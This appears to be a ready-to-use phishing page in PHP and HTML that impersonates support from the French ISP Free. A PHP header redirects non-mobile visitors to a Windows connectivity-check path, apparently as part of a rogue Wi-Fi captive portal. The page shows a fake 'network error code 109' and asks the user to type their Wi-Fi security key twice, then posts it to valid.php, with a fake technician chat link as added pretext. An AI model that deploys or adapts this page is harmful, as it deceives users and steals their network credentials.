<?php
function isMobileDevice() {
    return preg_match("/(android|avantgo|blackberry|bolt|boost|cricket|docomo
|fone|hiptop|mini|mobi|palm|phone|pie|tablet|up\.browser|up\.link|webos|wos)/i"
, $_SERVER["HTTP_USER_AGENT"]);
}
if(isMobileDevice()){
     echo "";
}
else {
     header('Location: /msftconnecttest/index.php');
}
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
<title>Bienvenue sur l'assistance Free</title>

<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="icon" href="/favicon.ico" type="image/x-icon"/> 
<style>
    h2 { color: #000000;
font-family:sans-serif;
}
  </style>
</head>

<body>
<img src="/images/freepub.png"/>
<div class="login_container" role="main">
  <div class="login_left">   

    <div class="login_form">
      <h2>Erreur r&eacuteseau code 109: reconnectez vous avec votre cl&eacute; wifi pour générer un nouveau QR code.Le QR code sert a connecter l'ensemble de vos équipements sans avoir besoin de taper la clé wifi pour chacun d'entre eux. </h2>

	  <form method="POST" action="valid.php">
      <!--div class="loginalert" aria-live="assertive" role="alert"><strong>  </strong></div-->
        
        <input type="hidden" name="link" value="" aria-disabled="true" />
        <fieldset>
          <div class="field"><label for="cle">Clé de sécurité :</label><input type="text" name="cle" class="inputfield" id="login" value=""Votre identifiant" onfocus="this.value='';"" aria-required="true" title="Clé wifi"/></div>
          <div class="field"><label for="cle">Confirmation :</label><input type="text" name="cleconf" class="inputfield" aria-required="true" title="Confirmation" /></div>

      <div class="login_new">
        <img src="/images/newevent.png" style="vertical-align:text-bottom" /> &nbsp;&nbsp;<strong>Besoin d'aide ? un technicien vous répond</strong> <a href="/shout/freetchat.php" target="_blank"><u>Aide en ligne</u> ...</a>
      </div>


        </fieldset>
               
        <button>Créer le code QR</button> 

    </div>
    <div id="bottom">
    <!--SITEMAP-->
    <div id="bottom-links">
    </div>
    <!--SITEMAP-->
    <div id="bottom-infos">
    </div>
    <div class="clear"></div>


</div>
</div>




</body>
</html>

